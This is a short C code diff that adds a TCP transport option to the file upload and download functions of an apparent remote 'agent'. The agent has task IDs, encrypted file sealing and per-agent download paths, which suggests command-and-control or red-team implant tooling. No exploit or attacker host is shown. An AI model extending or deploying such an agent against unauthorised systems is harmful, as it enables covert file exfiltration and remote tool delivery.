@@ -630,6 +630,10 @@ void agent_send_result(long long task_id, const char *output, const char *error)
 void agent_upload_file(long long task_id, const char *filename,
                        const uint8_t *data, size_t data_len) {
     if (!g_agent.has_key) return;
+    if (strcmp(AGENT_TRANSPORT, "tcp") == 0) {
+        transport_tcp_upload_file(task_id, filename, data, data_len);
+        return;
+    }
     (void)task_id;
     size_t enc_len = 0;
     uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32, data, data_len, &enc_len);
@@ -646,6 +650,8 @@ void agent_upload_file(long long task_id, const char *filename,
 uint8_t* agent_download_file(const char *filename, size_t *out_len) {
     *out_len = 0;
     if (!g_agent.has_key) return NULL;
+    if (strcmp(AGENT_TRANSPORT, "tcp") == 0)
+        return transport_tcp_download_file(filename, out_len);
     char path[256];
     snprintf(path, sizeof(path), "/dl/%s/%s", g_agent.agent_id, filename);
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
